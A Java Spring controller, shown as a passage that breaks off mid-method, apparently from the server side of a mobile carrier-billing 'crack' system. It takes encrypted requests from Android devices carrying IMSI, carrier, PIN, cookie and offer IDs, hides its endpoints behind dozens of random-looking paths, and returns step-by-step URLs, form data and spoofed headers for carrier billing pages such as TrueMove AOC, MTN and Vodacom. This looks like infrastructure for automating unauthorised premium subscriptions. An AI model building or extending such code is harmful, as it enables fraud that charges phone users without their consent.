package com.starp.zoo.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.starp.zoo.common.AexErrorCodeEnum;
import com.starp.zoo.common.ResponseInfoEnum;
import com.starp.zoo.common.ResponseInfoUtil;
import com.starp.zoo.common.constant.Constants;
import com.starp.zoo.common.constant.ProtocolCrackConstant;
import com.starp.zoo.config.AndroidGroupGetAesConfig;
import com.starp.zoo.config.AndroidGroupGetDesConfig;
import com.starp.zoo.constant.TruemoveAocJs;
import com.starp.zoo.constant.ZooConstant;
import com.starp.zoo.entity.zoo.HttpLoggingModel;
import com.starp.zoo.repo.zoo.HttpLoggingRepo;
import com.starp.zoo.service.IAndroidMncService;
import com.starp.zoo.service.ICrackStepService;
import com.starp.zoo.service.IHttpLoggingRecordService;
import com.starp.zoo.service.IHttpLoggingService;
import com.starp.zoo.service.ILogService;
import com.starp.zoo.service.IUserAgentService;
import com.starp.zoo.util.AesUtil;
import com.starp.zoo.util.DesUtil;
import com.starp.zoo.util.IpUtil;
import com.starp.zoo.vo.AnalysisBodyVO;
import edu.umd.cs.findbugs.annotations.SuppressFBWarnings;
import io.micrometer.core.annotation.Timed;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import java.util.*;

/**
 * @author starp
 */
@Slf4j
@Controller
public class AndroidGroupPullHttpJsController {

    @Autowired
    private ICrackStepService crackStepService;

    @Autowired
    private ILogService logService;

    @Autowired
    private IAndroidMncService mncService;

    @Autowired
    HttpLoggingRepo httpLoggingRepo;

    @Autowired
    IUserAgentService userAgentService;

    @Autowired
    private IHttpLoggingService httpLoggingService;

    @Autowired
    private IHttpLoggingRecordService httpLoggingRecordService;

    /**
     * 战斧方案执行JS
     * HTTP ALEX PULL CONFIG
     *
     * @param request
     * @param body
     * @return
     * @throws Exception
     */
    @Timed
    @SuppressFBWarnings("RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/us1/8hdnz", "/szm/sdyup", "/nze/df3uw", "/ynd/dfjl3", "/xys/sd54h", "/zhd/sd4jk", "/dyh/ycxme", "/usj/zmisw", "/dus/dui4n", "/sdh/zni2s", "/znj/duf18", "/nlp/2i86b", "/bhc/zbc23", "/hsl/gd6b1", "/sdz/qloa2", "/snj/zio4a", "/kvh/cgk3S", "/lsk/v1SdJ", "/sda/2SD8m", "/xer/v5fdv", "/osj/vHk2s", "/vbt/bn3Kb", "/kvb/rhvsJ", "/ejk/b3k4k", "/kqw/wtkNb", "/akt/lePgk", "/vng/lqhgn", "/bgs/uyhTn", "/jdg/wk5sn", "/jvt/bvkgk", "/une/nj3nK"}, method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String analysisBody(HttpServletRequest request, @RequestBody String body) throws Exception {
        HttpLoggingModel httpLoggingModel = new HttpLoggingModel();
        String ipAddress = IpUtil.getIpAddr(request);
        String result = Constants.NULL_VALUE;
        String errorMessage = "";
        DesUtil desUtil = null;
        String param = "";
        try {
            desUtil = AndroidGroupGetDesConfig.getDes(request);
        } catch (Exception e) {
            errorMessage = formatErrorMessage(AexErrorCodeEnum.DECODE_ENCRYPT_ERROR.getCode(), AexErrorCodeEnum.DECODE_ENCRYPT_ERROR.getMsg());
            return ResponseInfoUtil.success(errorMessage, desUtil);
        }
        JSONObject bodyJsonObject;
        if (!StringUtils.isEmpty(body)) {
            try {
                param = desUtil.decode(body);
                bodyJsonObject = JSONObject.parseObject(param);
            } catch (Exception e) {
                errorMessage = formatErrorMessage(AexErrorCodeEnum.DECODE_ERROR.getCode(), AexErrorCodeEnum.DECODE_ERROR.getMsg());
                return ResponseInfoUtil.success(errorMessage, desUtil);
            }

            Long timestamp = bodyJsonObject.getLong("ttl");
            String appId = bodyJsonObject.getString("ap");
            String offerId = bodyJsonObject.getString("of");
            String isDebug = bodyJsonObject.getString("debug");
            String deviceId = bodyJsonObject.getString("deviceId");
            String cookie = bodyJsonObject.getString("cookie");
            String operator = mncService.generateOp(bodyJsonObject.getString("sio"));
            if (StringUtils.isEmpty(operator)) {
                errorMessage = formatErrorMessage(AexErrorCodeEnum.OPERATOR_MATCH_ERROR.getCode(), bodyJsonObject.getString("sio") + AexErrorCodeEnum.OPERATOR_MATCH_ERROR.getMsg());
                return ResponseInfoUtil.success(errorMessage, desUtil);
            }
            httpLoggingModel = generateHttpLogginModel(ipAddress, timestamp, body, bodyJsonObject, operator, httpLoggingModel);
            Map<String, Object> analysisList = crackStepService.analysisBody(request, bodyJsonObject.getString("path"), bodyJsonObject.getString("body"),
                    bodyJsonObject.getString("upc"), bodyJsonObject.getString("pid"), bodyJsonObject.getString("sh"), bodyJsonObject.getString("rh"),
                    operator, appId, offerId, bodyJsonObject.getString("userId"), isDebug, deviceId, timestamp, cookie);
            boolean existAnalysis = analysisList.get("analysisList") != null && ((List<AnalysisBodyVO>) analysisList.get("analysisList")).size() > 0;
            if (existAnalysis) {
                List<AnalysisBodyVO> analysisBodyVos = (List<AnalysisBodyVO>) analysisList.get("analysisList");
                for (AnalysisBodyVO analysisBodyVO : analysisBodyVos) {
                    httpLoggingModel.setRealUrl(analysisBodyVO.getUrl());
                    httpLoggingModel.setFormData(analysisBodyVO.getFormData());
                }
                if (analysisBodyVos.size() > 0) {
                    AnalysisBodyVO analysisBodyVO = analysisBodyVos.get(0);
                    if (ZooConstant.BRACKETS.equals(analysisBodyVO.getHs())) {
                        boolean isRedirect = Constants.TYPE_REDIRECT == (int) analysisList.get(TruemoveAocJs.IS_REDIRECT);
                        analysisBodyVO.setHs(userAgentService.getGlobalHeaders((String) bodyJsonObject.get("path"), isRedirect, bodyJsonObject.getString("userId")).toJSONString());
                    }
                    result = JSON.toJSONString(analysisBodyVO);
                }
                return ResponseInfoUtil.success(result, desUtil);
            } else if (!StringUtils.isEmpty(analysisList.get(ZooConstant.ERROR_MESSAGE))) {
                String errorMsg = (String) analysisList.get("errorMessage");
                errorMessage = formatErrorMessage((Integer) analysisList.get("errorCode"), errorMsg);
                httpLoggingModel.setFormData(errorMessage);
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            }
        } else {
            errorMessage = formatErrorMessage(AexErrorCodeEnum.ENCODE_CONTENT_NULL.getCode(), AexErrorCodeEnum.ENCODE_CONTENT_NULL.getMsg());
        }
        return ResponseInfoUtil.success(errorMessage, desUtil);
    }


    /**
     * 新战斧方案执行JS
     * HTTP ALEX PULL CONFIG
     * 适配JSON 或者JSONArray
     *
     * @param request
     * @param body
     * @return
     * @throws Exception
     */
    @Timed
    @SuppressFBWarnings({"RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE", "NP_ALWAYS_NULL"})
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/tyu/dsyta","/c80/kkfds","/fh2/345as","/vc8/x03hs","/pdx/sp23x","/opx/cs882", "/opf/hgf81","/gh5/54f44","/sza/u28nc", "/nsh/zu4da", "/ops/dujis", "/cuk/ui4nf", "/ifb/ci52g","/d27/q455w","/sa4/das66","/vd0/lm12s", "/bnx/gk2cb", "/dal/tsj8h", "/ydm/din2u", "/ydb/cd8bf","/fds/4567w", "/udm/df48j", "/xvf/whx2r", "/ydw/duu4f", "/tgs/cz7bj","/sd8/6578p","/ylm/wznm6","/fd3/7ik13", "/ygf/iodfj", "/duf/risn3"}, method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String newAnalysisBody(HttpServletRequest request, @RequestBody String body) throws Exception {
        String servletPath = request.getServletPath();
        HttpLoggingModel httpLoggingModel = new HttpLoggingModel();
        String ipAddress = IpUtil.getIpAddr(request);
        String result = Constants.NULL_VALUE;
        String errorMessage = "";
        DesUtil desUtil = null;
        String param = "";
        try {
            desUtil = AndroidGroupGetDesConfig.getDes(request);
        } catch (Exception e) {
            errorMessage = formatErrorMessage(AexErrorCodeEnum.DECODE_ENCRYPT_ERROR.getCode(), AexErrorCodeEnum.DECODE_ENCRYPT_ERROR.getMsg());
            return ResponseInfoUtil.success(errorMessage, desUtil);
        }
        List<JSONObject> bodyJsonList = new ArrayList<>();
        if (!StringUtils.isEmpty(body)) {
            try {
                param = desUtil.decode(body);
                Object androidParams = JSON.parse(param);
                if (androidParams instanceof JSONObject) {
                    JSONObject bodyJsonObject = JSONObject.parseObject(((JSONObject) androidParams).toJSONString());
                    String operator = mncService.generateOp(bodyJsonObject.getString("sio"));
                    if (StringUtils.isEmpty(operator)) {
                        errorMessage = formatErrorMessage(AexErrorCodeEnum.OPERATOR_MATCH_ERROR.getCode(), bodyJsonObject.getString("sio") + AexErrorCodeEnum.OPERATOR_MATCH_ERROR.getMsg());
                        return ResponseInfoUtil.success(errorMessage, desUtil);
                    }
                    bodyJsonList.add(bodyJsonObject);
                    JSONObject resultObject = handleCrackJson(ipAddress, bodyJsonList, httpLoggingModel, body, operator, request, result, errorMessage);
                    if (ZooConstant.ZA_MTN.equals(httpLoggingModel.getCarrier()) || ZooConstant.ZA_VODACOM.equals(httpLoggingModel.getCarrier())) {
                        httpLoggingService.saveLoggingFileToS3(httpLoggingModel, desUtil, servletPath, resultObject.getString("result"));
                        httpLoggingRecordService.saveRecord(httpLoggingModel);
                    }
                    if (StringUtils.isEmpty(resultObject.getString(ZooConstant.ERROR_MESSAGE))) {
                        return ResponseInfoUtil.success(resultObject.getString("result"), desUtil);
                    } else {
                        return ResponseInfoUtil.errorMsg(resultObject.getString(ZooConstant.ERROR_MESSAGE), desUtil);
                    }
                } else if (androidParams instanceof JSONArray) {
                    JSONArray bodyJsonArray = JSONArray.parseArray(((JSONArray) androidParams).toJSONString());
                    JSONObject resultJsonArray = handleCrackJsonArray(ipAddress, bodyJsonArray, body, request, result);
                    if (ZooConstant.ZA_MTN.equals(httpLoggingModel.getCarrier()) || ZooConstant.ZA_VODACOM.equals(httpLoggingModel.getCarrier())) {
                        httpLoggingService.saveLoggingFileToS3(httpLoggingModel, desUtil, servletPath, resultJsonArray.getString("result"));
                        httpLoggingRecordService.saveRecord(httpLoggingModel);
                    }
                    if (StringUtils.isEmpty(resultJsonArray.getString(ZooConstant.ERROR_MESSAGE))) {
                        return ResponseInfoUtil.success(resultJsonArray.getString("result"), desUtil);
                    } else {
                        return ResponseInfoUtil.errorMsg(resultJsonArray.getString(ZooConstant.ERROR_MESSAGE), desUtil);
                    }
                }
            } catch (Exception e) {
                log.info("error:{}", e.getMessage());
                errorMessage = formatErrorMessage(AexErrorCodeEnum.DECODE_ERROR.getCode(), AexErrorCodeEnum.DECODE_ERROR.getMsg());
                return ResponseInfoUtil.success(errorMessage, desUtil);
            }

        } else {
            errorMessage = formatErrorMessage(AexErrorCodeEnum.ENCODE_CONTENT_NULL.getCode(), AexErrorCodeEnum.ENCODE_CONTENT_NULL.getMsg());
        }
        return ResponseInfoUtil.success(errorMessage, desUtil);
    }

    /**
     * NEW HTTP ALEX PULL CONFIG
     * 适配JSON 或者JSONArray
     * @param request
     * @param body
     * @return byte[]
     * @author Curry
     * @date 2022/11/1
     */
    @Timed
    @SuppressFBWarnings({"RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE", "NP_ALWAYS_NULL", "DM_DEFAULT_ENCODING"})
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/glist", "/carr", "/cabsorb", "/gachieve", "/cactress", "/gadministration", "/cadvertising", "/gagainst", "/cairline", "/galter",
            "/canger", "/ganymore", "/csapple", "/garea", "/carrive", "/cassessment", "/gathlete", "/cattribute", "/cawful", "/cbank", "/cbathroom",
    "/gbeer", "/gbelt", "/gcancer", "/ccareer", "/ccelebrity"})
    @ResponseBody
    public byte[] newAnalysisBodyNew(HttpServletRequest request, @RequestBody byte[] body) throws Exception {
        AesUtil desUtil = null;
        int encodeType = 1;
        if (request.getRequestURI().indexOf(ZooConstant.SPLIT_C) == -1) {
            encodeType = 2;
        }
        String servletPath = request.getServletPath();
        HttpLoggingModel httpLoggingModel = new HttpLoggingModel();
        String ipAddress = IpUtil.getIpAddr(request);
        String result = Constants.NULL_VALUE;
        String errorMessage = "";
        String param = "";
        try {
            desUtil = AndroidGroupGetAesConfig.getAes(request);
        } catch (Exception e) {
            errorMessage = formatErrorMessage(AexErrorCodeEnum.DECODE_ENCRYPT_ERROR.getCode(), AexErrorCodeEnum.DECODE_ENCRYPT_ERROR.getMsg());
            return ResponseInfoUtil.successByte(errorMessage, desUtil, encodeType);
        }
        List<JSONObject> bodyJsonList = new ArrayList<>();
        if (!StringUtils.isEmpty(body)) {
            try {
                param = new String(desUtil.decode(body, encodeType));
                Object androidParams = JSON.parse(param);
                if (androidParams instanceof JSONObject) {
                    JSONObject bodyJsonObject = JSONObject.parseObject(((JSONObject) androidParams).toJSONString());
                    String operator = mncService.generateOp(bodyJsonObject.getString("sio"));
                    if (StringUtils.isEmpty(operator)) {
                        errorMessage = formatErrorMessage(AexErrorCodeEnum.OPERATOR_MATCH_ERROR.getCode(), bodyJsonObject.getString("sio") + AexErrorCodeEnum.OPERATOR_MATCH_ERROR.getMsg());
                        return ResponseInfoUtil.successByte(errorMessage, desUtil, encodeType);
                    }
                    bodyJsonList.add(bodyJsonObject);
                    JSONObject resultObject = handleCrackJson(ipAddress, bodyJsonList, httpLoggingModel, new String(body), operator, request, result, errorMessage);
                    if (ZooConstant.ZA_MTN.equals(httpLoggingModel.getCarrier()) || ZooConstant.ZA_VODACOM.equals(httpLoggingModel.getCarrier())) {
                        httpLoggingService.saveLoggingFileToS3New(httpLoggingModel, desUtil, servletPath, resultObject.getString("result"), encodeType);
                        httpLoggingRecordService.saveRecord(httpLoggingModel);
                    }
                    if (StringUtils.isEmpty(resultObject.getString(ZooConstant.ERROR_MESSAGE))) {
                        return ResponseInfoUtil.successByte(resultObject.getString("result"), desUtil, encodeType);
                    } else {
                        return ResponseInfoUtil.errorMsgByte(resultObject.getString(ZooConstant.ERROR_MESSAGE), desUtil, encodeType);
                    }
                } else if (androidParams instanceof JSONArray) {
                    JSONArray bodyJsonArray = JSONArray.parseArray(((JSONArray) androidParams).toJSONString());
                    JSONObject resultJsonArray = handleCrackJsonArray(ipAddress, bodyJsonArray, new String(body), request, result);
                    if (ZooConstant.ZA_MTN.equals(httpLoggingModel.getCarrier()) || ZooConstant.ZA_VODACOM.equals(httpLoggingModel.getCarrier())) {
                        httpLoggingService.saveLoggingFileToS3New(httpLoggingModel, desUtil, servletPath, resultJsonArray.getString("result"), encodeType);
                        httpLoggingRecordService.saveRecord(httpLoggingModel);
                    }
                    if (StringUtils.isEmpty(resultJsonArray.getString(ZooConstant.ERROR_MESSAGE))) {
                        return ResponseInfoUtil.successByte(resultJsonArray.getString("result"), desUtil, encodeType);
                    } else {
                        return ResponseInfoUtil.errorMsgByte(resultJsonArray.getString(ZooConstant.ERROR_MESSAGE), desUtil, encodeType);
                    }
                }
            } catch (Exception e) {
                log.info("error:{}", e.getMessage());
                errorMessage = formatErrorMessage(AexErrorCodeEnum.DECODE_ERROR.getCode(), AexErrorCodeEnum.DECODE_ERROR.getMsg());
                return ResponseInfoUtil.successByte(errorMessage, desUtil, encodeType);
            }

        } else {
            errorMessage = formatErrorMessage(AexErrorCodeEnum.ENCODE_CONTENT_NULL.getCode(), AexErrorCodeEnum.ENCODE_CONTENT_NULL.getMsg());
        }
        return ResponseInfoUtil.successByte(errorMessage, desUtil, encodeType);
    }

    @SuppressFBWarnings("NP_NULL_PARAM_DEREF")
    private JSONObject handleCrackJson(String ipAddress, List<JSONObject> bodyJsonArray, HttpLoggingModel httpLoggingModel, String body, String operator, HttpServletRequest request, String result, String errorMessage) throws Exception {
        JSONObject resultObject = new JSONObject();
        // 处理参数是JSON
        if (bodyJsonArray != null && bodyJsonArray.size() == 1) {
            JSONObject bodyJsonObject = bodyJsonArray.get(0);
            Long timestamp = bodyJsonObject.getLong("ttl");
            Long nodeJstimeStamp = timestamp;
            String appId = bodyJsonObject.getString("ap");
            String offerId = bodyJsonObject.getString("of");
            String isDebug = bodyJsonObject.getString("debug");
            String deviceId = bodyJsonObject.getString("deviceId");
            String cookie = bodyJsonObject.getString("cookie");
            httpLoggingModel = generateHttpLogginModel(ipAddress, timestamp, body, bodyJsonObject, operator, httpLoggingModel);
            Map<String, Object> analysisList = crackStepService.analysisBody(request, bodyJsonObject.getString("path"), bodyJsonObject.getString("body"),
                    bodyJsonObject.getString("upc"), bodyJsonObject.getString("pid"), bodyJsonObject.getString("sh"), bodyJsonObject.getString("rh"),
                    operator, appId, offerId, bodyJsonObject.getString("userId"), isDebug, deviceId, nodeJstimeStamp, cookie);
            boolean existAnalysis = analysisList.get("analysisList") != null && ((List<AnalysisBodyVO>) analysisList.get("analysisList")).size() > 0;
            httpLoggingModel.setStepId(StringUtils.isEmpty(analysisList.get("stepIndex")) ? "0" : analysisList.get("stepIndex").toString());
            httpLoggingModel.setStepName(analysisList.get("stepName").toString());
            if (existAnalysis) {
                List<AnalysisBodyVO> analysisBodyVos = (List<AnalysisBodyVO>) analysisList.get("analysisList");
                for (AnalysisBodyVO analysisBodyVO : analysisBodyVos) {
                    httpLoggingModel.setRealUrl(analysisBodyVO.getUrl());
                    httpLoggingModel.setFormData(analysisBodyVO.getFormData());
                }
                if (analysisBodyVos.size() > 0 && analysisBodyVos.size() == 1) {
                    AnalysisBodyVO analysisBodyVO = analysisBodyVos.get(0);
                    if (ZooConstant.BRACKETS.equals(analysisBodyVO.getHs())) {
                        boolean isRedirect = Constants.TYPE_REDIRECT == (int) analysisList.get(TruemoveAocJs.IS_REDIRECT);
                        analysisBodyVO.setHs(userAgentService.getGlobalHeaders((String) bodyJsonObject.get("path"), isRedirect, bodyJsonObject.getString("userId")).toJSONString());
                    }
                    result = JSON.toJSONString(analysisBodyVO);
                    resultObject.put("result", result);
                } else if (analysisBodyVos.size() > 0 && analysisBodyVos.size() > 1) {
                    boolean isRedirect = Constants.TYPE_REDIRECT == (int) analysisList.get(TruemoveAocJs.IS_REDIRECT);
                    analysisBodyVos.stream().filter(analysisBodyVO -> ZooConstant.BRACKETS.equals(analysisBodyVO.getHs())).forEach(analysisBodyVO -> analysisBodyVO.setHs(userAgentService.getGlobalHeaders((String) bodyJsonObject.get("path"), isRedirect, bodyJsonObject.getString("userId")).toJSONString()));
                    result = JSON.toJSONString(analysisBodyVos);
                    resultObject.put("result", result);
                }
            } else if (!StringUtils.isEmpty(analysisList.get(ZooConstant.ERROR_MESSAGE))) {
                String errorMsg = (String) analysisList.get(ZooConstant.ERROR_MESSAGE);
                errorMessage = formatErrorMessage((Integer) analysisList.get(ZooConstant.ERROR_CODE), errorMsg);
                httpLoggingModel.setFormData(errorMessage);
                resultObject.put(ZooConstant.ERROR_MESSAGE, errorMessage);
            }
        } else {
            generateHttpLogginModelByParamArray(ipAddress, bodyJsonArray, body, operator);
            Map<String, Object> analysisList = crackStepService.analysisBodyParamArray(request, bodyJsonArray);
            httpLoggingModel.setStepId(StringUtils.isEmpty(analysisList.get("stepIndex")) ? "0" : analysisList.get("stepIndex").toString());
            httpLoggingModel.setStepName(analysisList.get("stepName").toString());
            boolean existAnalysis = analysisList.get("analysisList") != null && ((List<AnalysisBodyVO>) analysisList.get("analysisList")).size() > 0;
            if (existAnalysis) {
                List<AnalysisBodyVO> analysisBodyVos = (List<AnalysisBodyVO>) analysisList.get("analysisList");
                for (AnalysisBodyVO analysisBodyVO : analysisBodyVos) {
                    httpLoggingModel.setRealUrl(analysisBodyVO.getUrl());
                    httpLoggingModel.setFormData(analysisBodyVO.getFormData());
                }
                if (analysisBodyVos.size() > 0) {
                    for (AnalysisBodyVO analysisBodyVO : analysisBodyVos) {
                        if (ZooConstant.BRACKETS.equals(analysisBodyVO.getHs())) {
                            boolean isRedirect = Constants.TYPE_REDIRECT == (int) analysisList.get(TruemoveAocJs.IS_REDIRECT);
                            analysisBodyVO.setHs(userAgentService.getGlobalHeaders((String) bodyJsonArray.get(analysisBodyVos.indexOf(analysisBodyVO)).get("path"), isRedirect,
                                    bodyJsonArray.get(analysisBodyVos.indexOf(analysisBodyVO)).getString("userId")).toJSONString());
                        }
                    }
                    result = JSON.toJSONString(analysisBodyVos);
                    resultObject.put("result", result);
                }
            } else if (!StringUtils.isEmpty(analysisList.get(ZooConstant.ERROR_MESSAGE))) {
                String errorMsg = (String) analysisList.get(ZooConstant.ERROR_MESSAGE);
                errorMessage = formatErrorMessage((Integer) analysisList.get(ZooConstant.ERROR_CODE), errorMsg);
                httpLoggingModel.setFormData(errorMessage);
                resultObject.put(ZooConstant.ERROR_MESSAGE, errorMessage);
            }
        }
        return resultObject;
    }

    private List<HttpLoggingModel> generateHttpLogginModelByParamArray(String ipAddress, List<JSONObject> bodyJsonArray, String body, String operator) {
        List<HttpLoggingModel> httpLoggingModelList = new ArrayList<>();
        for (JSONObject param : bodyJsonArray) {
            HttpLoggingModel loggingModel = new HttpLoggingModel();
            Long timestamp = param.getLong("ttl");
            loggingModel = generateHttpLogginModel(ipAddress, timestamp, body, param, operator, loggingModel);
            httpLoggingModelList.add(loggingModel);
        }
        return httpLoggingModelList;
    }

    private JSONObject handleCrackJsonArray(String ipAddress, JSONArray bodyJsonArray, String body, HttpServletRequest request, String result) throws Exception {
        JSONObject resultValue = new JSONObject();
        JSONArray jsonArray = new JSONArray();
        List<JSONObject> paramArray = new ArrayList<>();
        String errorMessage = "";
        String operator = "";
        for (Object object : bodyJsonArray) {
            JSONObject params = JSONObject.parseObject(object.toString());
            operator = mncService.generateOp(params.getString("sio"));
            if (StringUtils.isEmpty(operator)) {
                errorMessage = formatErrorMessage(AexErrorCodeEnum.OPERATOR_MATCH_ERROR.getCode(), params.getString("sio") + AexErrorCodeEnum.OPERATOR_MATCH_ERROR.getMsg());
            } else {
                paramArray.add(params);
            }
        }
        HttpLoggingModel httpLoggingModel = new HttpLoggingModel();
        JSONObject resultObject = handleCrackJson(ipAddress, paramArray, httpLoggingModel, body, operator, request, result, errorMessage);
        if (StringUtils.isEmpty(resultObject.getString(ZooConstant.ERROR_MESSAGE))) {
            jsonArray.add(JSONObject.parse(resultObject.getString("result")));
        } else {
            errorMessage = resultObject.getString(ZooConstant.ERROR_MESSAGE);
            resultValue.put(ZooConstant.ERROR_MESSAGE, errorMessage);
        }
        if (jsonArray.size() > 0) {
            resultValue.put("result", jsonArray.toJSONString());
        }
        return resultValue;
    }


    private HttpLoggingModel generateHttpLogginModel(String ipAddress, Long timestamp, String body, JSONObject bodyJsonObject, String operator, HttpLoggingModel httpLoggingModel) {
        httpLoggingModel.setIp(ipAddress);
        if (timestamp == null) {
            httpLoggingModel.setClientTime(new Date());
        } else {
            httpLoggingModel.setClientTime(new Date(timestamp));
        }
        httpLoggingModel.setBody(body);
        httpLoggingModel.setUrl(bodyJsonObject.getString("path"));
        httpLoggingModel.setImsi(bodyJsonObject.getString("sio"));

        httpLoggingModel.setCarrier(operator);
        httpLoggingModel.setPin(bodyJsonObject.getString("upc"));
        httpLoggingModel.setPid(bodyJsonObject.getString("pid"));
        httpLoggingModel.setUserId(!StringUtils.isEmpty(bodyJsonObject.getString("userid")) ? bodyJsonObject.getString("userid") : bodyJsonObject.getString("deviceId"));
        httpLoggingModel.setAppId(bodyJsonObject.getString("ap"));
        httpLoggingModel.setOfferId(bodyJsonObject.getString("of"));
        return httpLoggingModel;
    }

    private String sortHs(String hsString) {
        JSONObject jsonObject = JSON.parseObject(hsString);
        JSONObject sortedHs = new JSONObject(true);
        if (jsonObject.containsKey(ProtocolCrackConstant.HOST)) {
            sortedHs.put(ProtocolCrackConstant.HOST, jsonObject.get(ProtocolCrackConstant.HOST));
        }
        if (jsonObject.containsKey(ProtocolCrackConstant.USER_AGENT)) {
            sortedHs.put(ProtocolCrackConstant.USER_AGENT, jsonObject.get(ProtocolCrackConstant.USER_AGENT));
        }
        if (jsonObject.containsKey(ProtocolCrackConstant.ACCEPT)) {
            sortedHs.put(ProtocolCrackConstant.ACCEPT, jsonObject.get(ProtocolCrackConstant.ACCEPT));
        }
        if (jsonObject.containsKey(ProtocolCrackConstant.ACCEPT_LANGUAGE)) {
            sortedHs.put(ProtocolCrackConstant.ACCEPT_LANGUAGE, jsonObject.get(ProtocolCrackConstant.ACCEPT_LANGUAGE));
        }
        if (jsonObject.containsKey(ProtocolCrackConstant.ACCEPT_ENCODING)) {
            sortedHs.put(ProtocolCrackConstant.ACCEPT_ENCODING, jsonObject.get(ProtocolCrackConstant.ACCEPT_ENCODING));
        }
        if (jsonObject.containsKey(ProtocolCrackConstant.CONTENT_LENGTH)) {
            sortedHs.put(ProtocolCrackConstant.CONTENT_LENGTH, jsonObject.get(ProtocolCrackConstant.CONTENT_LENGTH));
        }
        if (jsonObject.containsKey(ProtocolCrackConstant.ORIGIN)) {
            sortedHs.put(ProtocolCrackConstant.ORIGIN, jsonObject.get(ProtocolCrackConstant.ORIGIN));
        }
        if (jsonObject.containsKey(ProtocolCrackConstant.CONNECTION)) {
            sortedHs.put(ProtocolCrackConstant.CONNECTION, jsonObject.get(ProtocolCrackConstant.CONNECTION));
        }
        if (jsonObject.containsKey(ProtocolCrackConstant.REFERER)) {
            sortedHs.put(ProtocolCrackConstant.REFERER, jsonObject.get(ProtocolCrackConstant.REFERER));
        }
        return JSONObject.toJSONString(sortedHs);
    }

    /**
     * 战斧方案执行JS 不加密解密
     *
     * @param request
     * @param bodyJsonObject
     * @return
     * @throws Exception
     */
    @SuppressFBWarnings("RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = "/BattleAxe/js/without/des", method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String analysisBodyWithoutDes(HttpServletRequest request, @RequestBody JSONObject bodyJsonObject) throws Exception {
        HttpLoggingModel httpLoggingModel = new HttpLoggingModel();
        String ipAddress = IpUtil.getIpAddr(request);
        String result = Constants.NULL_VALUE;
        String errorMessage = "";
        if (bodyJsonObject != null) {
            try {
                log.info("analysisBody ip:{}, decodedBody:{}", ipAddress, bodyJsonObject.toJSONString());
                Long timestamp = bodyJsonObject.getLong("ttl");
                Long nodejsTimeStamp = timestamp;
                // appid
                String appId = bodyJsonObject.getString("ap");
                String offerId = bodyJsonObject.getString("of");
                String isDebug = bodyJsonObject.getString("debug");
                String deviceId = bodyJsonObject.getString("deviceId");
                String cookie = bodyJsonObject.getString("cookie");
                httpLoggingModel.setIp(ipAddress);
                if (timestamp == null) {
                    httpLoggingModel.setClientTime(new Date());
                } else {
                    httpLoggingModel.setClientTime(new Date(timestamp));
                }
                httpLoggingModel.setBody(JSON.toJSONString(bodyJsonObject));
                httpLoggingModel.setUrl(bodyJsonObject.getString("path"));
                httpLoggingModel.setImsi(bodyJsonObject.getString("sio"));
                String operator = mncService.generateOp(bodyJsonObject.getString("sio"));
                httpLoggingModel.setCarrier(operator);
                httpLoggingModel.setPin(bodyJsonObject.getString("upc"));
                httpLoggingModel.setPid(bodyJsonObject.getString("pid"));
                httpLoggingModel.setUserId(bodyJsonObject.getString("userId"));
                httpLoggingModel.setAppId(bodyJsonObject.getString("ap"));
                httpLoggingModel.setOfferId(bodyJsonObject.getString("of"));
                JSONObject responseHeader = new JSONObject();
                if (!StringUtils.isEmpty(bodyJsonObject.get(ZooConstant.RESPONSE_HEADER))) {
                    responseHeader = bodyJsonObject.getJSONObject(ZooConstant.RESPONSE_HEADER);
                }
                Map<String, Object> analysisList = crackStepService.analysisBody(request, bodyJsonObject.getString("path"), bodyJsonObject.getString("body"),
                        bodyJsonObject.getString("upc"), bodyJsonObject.getString("pid"), responseHeader.toJSONString(), bodyJsonObject.getString("rh"),
                        operator, appId, offerId, bodyJsonObject.getString("userId"), isDebug, deviceId, nodejsTimeStamp, cookie);
                boolean existAnalysis = analysisList.get("analysisList") != null && ((List<AnalysisBodyVO>) analysisList.get("analysisList")).size() > 0;
                if (existAnalysis) {
                    List<AnalysisBodyVO> analysisBodyVos = (List<AnalysisBodyVO>) analysisList.get("analysisList");
                    for (AnalysisBodyVO analysisBodyVO : analysisBodyVos) {
                        httpLoggingModel.setRealUrl(analysisBodyVO.getUrl());
                        httpLoggingModel.setFormData(analysisBodyVO.getFormData());
                    }
                    if (analysisBodyVos.size() > 0) {
                        AnalysisBodyVO analysisBodyVO = analysisBodyVos.get(0);
                        if (StringUtils.isEmpty(analysisBodyVO.getHs())) {
                            boolean isRedirect = Constants.TYPE_REDIRECT == (int) analysisList.get(TruemoveAocJs.IS_REDIRECT);
                            analysisBodyVO.setHs(userAgentService.getGlobalHeaders((String) bodyJsonObject.get("path"), isRedirect, bodyJsonObject.getString("userId")).toJSONString());
                        }
                        result = JSON.toJSONString(analysisBodyVO);
                    }
                    return result;
                } else if (!StringUtils.isEmpty(analysisList.get(ZooConstant.ERROR_MESSAGE))) {
                    String errorMsg = (String) analysisList.get("errorMessage");
                    errorMessage = formatErrorMessage((Integer) analysisList.get("errorCode"), errorMsg);
                    return errorMessage;
                }

            } catch (Exception e) {
                log.info("analysis error:{}", e.getMessage());
                log.info("analysis alex crack error:{}", JSON.toJSONString(e));
